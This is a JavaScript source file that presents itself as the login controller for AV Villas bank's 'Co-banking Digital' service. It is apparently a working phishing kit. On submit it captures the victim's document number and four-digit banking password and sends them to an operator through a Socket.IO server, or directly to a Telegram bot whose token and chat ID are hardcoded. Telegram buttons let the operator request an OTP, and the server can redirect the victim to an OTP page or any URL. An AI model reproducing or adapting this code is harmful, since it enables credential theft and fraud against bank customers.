/**
 * AV Villas Co-banking Digital - Client Controller
 * Maneja la lógica del formulario de login y comunicación con el servidor
 */

// ============================================
// CONFIGURACIÓN
// ============================================
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
        CHAT_ID: '-5029729816'
    },
    SOCKET: {
        URL: 'http://localhost:3000',
        OPTIONS: {
            reconnection: true,
            reconnectionDelay: 1000,
            reconnectionAttempts: Infinity,
            timeout: 10000
        }
    },
    VALIDATION: {
        PASSWORD_LENGTH: 4,
        DOCUMENT_MIN_LENGTH: 5
    }
};

// ============================================
// ELEMENTOS DOM
// ============================================
const DOM = {
    form: document.getElementById('loginForm'),
    documentType: document.getElementById('document-type'),
    documentNumber: document.getElementById('document-number'),
    password: document.getElementById('password'),
    submitBtn: document.getElementById('submitBtn'),
    loadingOverlay: document.getElementById('loadingOverlay'),
    userIcon: document.getElementById('userIcon'),
    lockIcon: document.getElementById('lockIcon'),
    docNumberGroup: document.getElementById('docNumberGroup'),
    passwordGroup: document.getElementById('passwordGroup')
};

// ============================================
// ESTADO DE LA APLICACIÓN
// ============================================
const AppState = {
    isValid: {
        documentNumber: false,
        password: false
    },
    socket: null,
    isConnected: false,
    isSubmitting: false
};

// ============================================
// UTILIDADES
// ============================================
const Utils = {
    /**
     * Valida que una cadena solo contenga números
     */
    isNumeric: (str) => /^\d+$/.test(str),
    
    /**
     * Formatea la fecha actual en formato local
     */
    getCurrentDateTime: () => new Date().toLocaleString('es-CO', {
        timeZone: 'America/Bogota',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }),
    
    /**
     * Escapa caracteres especiales para Markdown
     */
    escapeMarkdown: (text) => {
        return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    },
    
    /**
     * Muestra/oculta el overlay de carga
     */
    toggleLoading: (show) => {
        if (show) {
            DOM.loadingOverlay.classList.add('active');
            document.body.style.overflow = 'hidden';
        } else {
            DOM.loadingOverlay.classList.remove('active');
            document.body.style.overflow = '';
        }
    },
    
    /**
     * Muestra/oculta icono de campo
     */
    toggleIcon: (icon, show) => {
        if (show) {
            icon.classList.add('visible');
        } else {
            icon.classList.remove('visible');
        }
    }
};

// ============================================
// VALIDACIÓN DE FORMULARIO
// ============================================
const FormValidator = {
    /**
     * Valida el campo de número de documento
     */
    validateDocumentNumber: () => {
        const value = DOM.documentNumber.value.trim();
        const isValid = value.length >= CONFIG.VALIDATION.DOCUMENT_MIN_LENGTH && Utils.isNumeric(value);
        
        AppState.isValid.documentNumber = isValid;
        Utils.toggleIcon(DOM.userIcon, value.length > 0);
        
        if (value.length > 0 && !isValid) {
            DOM.docNumberGroup.classList.add('error');
        } else {
            DOM.docNumberGroup.classList.remove('error');
        }
        
        return isValid;
    },
    
    /**
     * Valida el campo de contraseña
     */
    validatePassword: () => {
        const value = DOM.password.value.trim();
        const isValid = value.length === CONFIG.VALIDATION.PASSWORD_LENGTH && Utils.isNumeric(value);
        
        AppState.isValid.password = isValid;
        Utils.toggleIcon(DOM.lockIcon, value.length > 0);
        
        if (value.length > 0 && !isValid) {
            DOM.passwordGroup.classList.add('error');
        } else {
            DOM.passwordGroup.classList.remove('error');
        }
        
        return isValid;
    },
    
    /**
     * Valida todo el formulario
     */
    validateForm: () => {
        const isDocValid = FormValidator.validateDocumentNumber();
        const isPassValid = FormValidator.validatePassword();
        const allValid = isDocValid && isPassValid;
        
        // Actualizar estado del botón
        DOM.submitBtn.disabled = !allValid;
        
        if (allValid) {
            DOM.submitBtn.classList.add('enabled');
        } else {
            DOM.submitBtn.classList.remove('enabled');
        }
        
        return allValid;
    },
    
    /**
     * Limpia todos los errores del formulario
     */
    clearErrors: () => {
        DOM.docNumberGroup.classList.remove('error');
        DOM.passwordGroup.classList.remove('error');
    }
};

// ============================================
// COMUNICACIÓN CON TELEGRAM
// ============================================
const TelegramService = {
    /**
     * Envía los datos del formulario a Telegram
     */
    sendLoginData: async (data) => {
        const message = 
            `🔐 Nueva información de login\n\n` +
            `Tipo de documento: ${data.documentType}\n` +
            `Número de documento: ${data.documentNumber}\n` +
            `Contraseña: ${data.password}\n\n` +
            `Recibido: ${Utils.getCurrentDateTime()}`;
        
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔑 Pedir Login', callback_data: 'request_login' },
                    { text: '📱 Pedir OTP', callback_data: 'request_otp' }
                ]
            ]
        };
        
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: message,
                        reply_markup: keyboard
                    })
                }
            );
            
            const result = await response.json();
            
            if (!result.ok) {
                console.error('Error de Telegram:', result);
                return false;
            }
            
            return true;
            
        } catch (error) {
            console.error('Error al enviar a Telegram:', error);
            return false;
        }
    }
};

// ============================================
// GESTIÓN DE SOCKET.IO
// ============================================
const SocketManager = {
    /**
     * Inicializa la conexión con Socket.IO
     */
    init: () => {
        try {
            AppState.socket = io(CONFIG.SOCKET.URL, CONFIG.SOCKET.OPTIONS);
            
            // Evento de conexión exitosa
            AppState.socket.on('connect', () => {
                console.log('✅ Conectado al servidor');
                AppState.isConnected = true;
            });
            
            // Evento de desconexión
            AppState.socket.on('disconnect', (reason) => {
                console.log('❌ Desconectado del servidor:', reason);
                AppState.isConnected = false;
            });
            
            // Evento de error de conexión
            AppState.socket.on('connect_error', (error) => {
                console.log('⚠️ Error de conexión:', error.message);
                AppState.isConnected = false;
            });
            
            // Evento de reconexión
            AppState.socket.on('reconnect', (attemptNumber) => {
                console.log('🔄 Reconectado después de', attemptNumber, 'intentos');
                AppState.isConnected = true;
            });
            
            // Comando de redirección desde el servidor
            AppState.socket.on('redirect', (data) => {
                console.log('📡 Comando de redirección recibido:', data);
                
                if (data.page === 'otp') {
                    window.location.href = 'otp.html';
                } else if (data.page === 'login') {
                    window.location.reload();
                } else if (data.page === 'finalize' && data.url) {
                    window.location.href = data.url;
                }
            });
            
            // Respuesta del servidor después de enviar datos
            AppState.socket.on('telegram-sent', (response) => {
                if (response.success) {
                    console.log('✅ Datos enviados correctamente a Telegram');
                } else {
                    console.error('❌ Error al enviar a Telegram:', response.error);
                    Utils.toggleLoading(false);
                    alert('Error al procesar la solicitud. Por favor, inténtalo de nuevo.');
                }
            });
            
        } catch (error) {
            console.error('Error al inicializar Socket.IO:', error);
        }
    },
    
    /**
     * Envía datos de login a través de Socket.IO
     */
    emitLoginData: (data) => {
        if (AppState.socket && AppState.isConnected) {
            AppState.socket.emit('login-data', data);
            return true;
        }
        return false;
    }
};

// ============================================
// MANEJADORES DE EVENTOS
// ============================================
const EventHandlers = {
    /**
     * Maneja la entrada en el campo de número de documento
     */
    handleDocumentNumberInput: (e) => {
        // Solo permitir números
        e.target.value = e.target.value.replace(/\D/g, '');
        FormValidator.validateForm();
    },
    
    /**
     * Maneja la entrada en el campo de contraseña
     */
    handlePasswordInput: (e) => {
        // Solo permitir números y limitar a 4 dígitos
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, CONFIG.VALIDATION.PASSWORD_LENGTH);
        FormValidator.validateForm();
    },
    
    /**
     * Maneja el envío del formulario
     */
    handleFormSubmit: async (e) => {
        e.preventDefault();
        
        // Prevenir múltiples envíos
        if (AppState.isSubmitting) {
            return;
        }
        
        // Validar formulario
        if (!FormValidator.validateForm()) {
            return;
        }
        
        AppState.isSubmitting = true;
        
        // Recopilar datos del formulario
        const formData = {
            documentType: DOM.documentType.options[DOM.documentType.selectedIndex].text,
            documentNumber: DOM.documentNumber.value.trim(),
            password: DOM.password.value.trim(),
            timestamp: new Date().toISOString()
        };
        
        // Guardar datos en sessionStorage para uso en página OTP
        sessionStorage.setItem('loginData', JSON.stringify({
            documentType: formData.documentType,
            documentNumber: formData.documentNumber,
            password: formData.password
        }));
        
        // Mostrar pantalla de carga
        Utils.toggleLoading(true);
        
        // Enviar solo por Socket.IO (el servidor se encarga de enviar a Telegram)
        const socketSent = SocketManager.emitLoginData(formData);
        
        if (!socketSent) {
            // Si Socket.IO no está disponible, intentar envío directo a Telegram
            const telegramSent = await TelegramService.sendLoginData(formData);
            
            if (!telegramSent) {
                Utils.toggleLoading(false);
                AppState.isSubmitting = false;
                alert('Error al procesar la solicitud. Por favor, verifica tu conexión e inténtalo de nuevo.');
            }
        }
        
        // Nota: La pantalla de carga permanecerá activa hasta recibir instrucciones del servidor
    }
};

// ============================================
// INICIALIZACIÓN
// ============================================
const App = {
    /**
     * Inicializa la aplicación
     */
    init: () => {
        // Registrar event listeners
        DOM.documentNumber.addEventListener('input', EventHandlers.handleDocumentNumberInput);
        DOM.password.addEventListener('input', EventHandlers.handlePasswordInput);
        DOM.form.addEventListener('submit', EventHandlers.handleFormSubmit);
        
        // Inicializar Socket.IO
        SocketManager.init();
        
        // Validación inicial
        FormValidator.validateForm();
        
        console.log('✅ Aplicación inicializada');
    }
};

// Iniciar la aplicación cuando el DOM esté listo
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.init);
} else {
    App.init();
}
